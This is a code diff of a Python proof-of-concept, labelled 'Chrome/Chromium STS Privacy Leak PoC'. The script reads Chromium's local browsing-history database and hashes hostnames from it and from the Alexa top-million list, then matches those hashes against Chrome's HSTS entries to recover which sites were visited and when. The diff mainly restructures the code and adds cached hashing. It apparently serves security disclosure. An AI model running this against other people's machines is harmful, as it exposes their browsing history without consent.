@@ -6,92 +6,107 @@
 #
 # Copyleft 2010 Ian Gallagher <crash@neg9.org>
 
-import os
-import sys
-import time
-import tempfile
-import shutil
-from pprint import pprint
+import os, sys, time, tempfile, shutil, cPickle, urllib
 from sqlite3 import dbapi2 as sqlite
+from cStringIO import StringIO
+from zipfile import ZipFile
 
 from chrome_sts_manager import ChromeSTS, hash_host
 
-print "# Chrome/Chromium STS Privacy Leak PoC"
-print "# Look up STS hosts based on precomputed hashes of your own browsing history + Alexa Top 1,000,000 domains"
-
 hist_db = os.path.join(os.environ['HOME'], 'Library/Application Support/Chromium/Default/History')
 alexa_file = 'top-1m.csv'
+alexa_file_pickle = 'top-1m_hashed.pickle'
 alexa_url = 'http://s3.amazonaws.com/alexa-static/top-1m.csv.zip'
 
-# Copy DB to a temp file so we can work on it while Chrome is running (and the db is locked)
-temp = tempfile.mktemp('.sqlite')
-shutil.copy(hist_db, temp)
+def pre_hash_alexa():
+    alexa_dict = {}
+    alexa_stringio = StringIO()
 
-history_domains = []
-alexa_domains = []
-host_list = set()
-host_dict = {}
+    print "Downloading %s ..." % alexa_url
+    alexa_stringio.write(urllib.urlopen(alexa_url).read())
+    alexa_zip = ZipFile(alexa_stringio)
 
-matched_entries = []
-unmatched_entries = []
+    print "Hashing + caching Alexa top 1,000,000 domain hashes, this may take about a minute..."
+    alexa_domains = map(lambda x: x.split(',', 1)[1].strip().split('/', 1)[0], alexa_zip.read(alexa_file).split('\n')[:-1])
 
-# Pull all hosts out of Chrome's browsing history (obviously juicy data we already have..)
-try:
-    con = sqlite.connect(temp)
-    cursor = con.cursor()
-    cursor.execute('SELECT url FROM urls')
-    result = cursor.fetchall()
-    url_list = map(lambda x: x[0], result)
-    history_domains = map(lambda x: x.split('/')[2], url_list)
-    history_domains = map(lambda x: x.split(':')[0], history_domains)
+    for host in alexa_domains:
+        hashed_hostname = hash_host(host)
+        alexa_dict[hashed_hostname] = host
 
-except Exception, ex:
-    raise
+    cPickle.dump(alexa_dict, open('top-1m_hashed.pickle', 'wb'), protocol=cPickle.HIGHEST_PROTOCOL)
 
-finally:
-    os.unlink(temp)
+    # Take advantage of the fact that python will return this by reference, so you can use it immediately without
+    # reading it back from disk.
+    return alexa_dict
 
-# Add in Alexa top 1million domains for completeness, unless -n flag given
-if len(sys.argv) > 1 and '-n' != sys.argv[1]:
+if '__main__' == __name__:
+    print "# Chrome/Chromium STS Privacy Leak PoC"
+    print "# Look up STS hosts based on precomputed hashes of your own browsing history + Alexa Top 1,000,000 domains"
+
+    # Copy DB to a temp file so we can work on it while Chrome is running (and the db is locked)
+    temp = tempfile.mktemp('.sqlite')
+    shutil.copy(hist_db, temp)
+
+    history_domains = []
+    alexa_domains = []
+    host_list = set()
+    host_dict = {}
+
+    matched_entries = []
+    unmatched_entries = []
+
+    # Pull all hosts out of Chrome's browsing history (obviously juicy data we already have..)
     try:
-        alexa_1m_file = open(alexa_file, 'r')
-        alexa_domains = map(lambda x: x.split(',', 1)[1].strip().split('/', 1)[0], alexa_1m_file.readlines())
-    except IOError, ex:
-        print >>sys.stderr, "You do not have the Alexa top 1,000,000 sites file (%s) - download and unzip here for better results: %s" % (alexa_file, alexa_url)
-        print >>sys.stderr, "Continuing with data collected only from Chrome browsing history, expect a potentially smaller set of results..."
-else:
-    print "User provided -n flag, continuing with data collected only from Chrome browsing history, expect a potentially smaller set of results..."
+        con = sqlite.connect(temp)
+        cursor = con.cursor()
+        cursor.execute('SELECT url FROM urls')
+        result = cursor.fetchall()
+        url_list = map(lambda x: x[0], result)
+        history_domains = map(lambda x: x.split('/')[2], url_list)
+        history_domains = map(lambda x: x.split(':')[0], history_domains)
 
-host_list = set(history_domains + alexa_domains)
+    except Exception, ex:
+        raise
 
-# Build a dictionary of hashed_host: hostname so we can easily lookup hosts based on their hash
-for host in host_list:
-    hashed_hostname = hash_host(host)
-    host_dict[hashed_hostname] = host
+    finally:
+        os.unlink(temp)
 
-# Create the Chrome STS Object that will hold all the STS entries from disk, and ones we add/delete
-csts = None
-try:
-    csts = ChromeSTS(autocommit=True)
-except Exception, ex:
-    raise
+    # Build a dictionary of hashed_host: hostname so we can easily lookup hosts based on their hash (from history)
+    for host in history_domains:
+        hashed_hostname = hash_host(host)
+        host_dict[hashed_hostname] = host
 
-for hashed_host, infodict in csts.items():
-    # Convert seconds since epoch to human readable string
-    created = time.ctime(infodict['created'])
-
-    if host_dict.has_key(hashed_host):
-        matched_entries.append((created, host_dict[hashed_host]))
+    # Add hashes for Alexa top 1m sites to the dictionary
+    if not os.path.isfile(alexa_file_pickle):
+        # Perhaps our first time running, generate them and load them.
+        host_dict.update(pre_hash_alexa())
     else:
-        unmatched_entries.append((created, hashed_host))
+        # We already have the Alexa hashes, yay! Load them (much quicker than generating them)
+        host_dict.update(cPickle.load(open(alexa_file_pickle, 'rb')))
 
-print "Matched STS host entries:"
+    # Create the Chrome STS Object that will hold all the STS entries from disk, and ones we add/delete
+    csts = None
+    try:
+        csts = ChromeSTS(autocommit=True)
+    except Exception, ex:
+        raise
 
-for match in matched_entries:
-    print "    Accessed: %s - %s" % match
+    for hashed_host, infodict in csts.items():
+        # Convert seconds since epoch to human readable string
+        created = time.ctime(infodict['created'])
 
-print ""
-print "Unmatched STS host hashes:"
+        if host_dict.has_key(hashed_host):
+            matched_entries.append((created, host_dict[hashed_host]))
+        else:
+            unmatched_entries.append((created, hashed_host))
 
-for unknown in unmatched_entries:
-    print "    Accessed: %s - %s" % unknown
+    print "Matched STS host entries:"
+
+    for match in matched_entries:
+        print "    Accessed: %s - %s" % match
+
+    print ""
+    print "Unmatched STS host hashes:"
+
+    for unknown in unmatched_entries:
+        print "    Accessed: %s - %s" % unknown
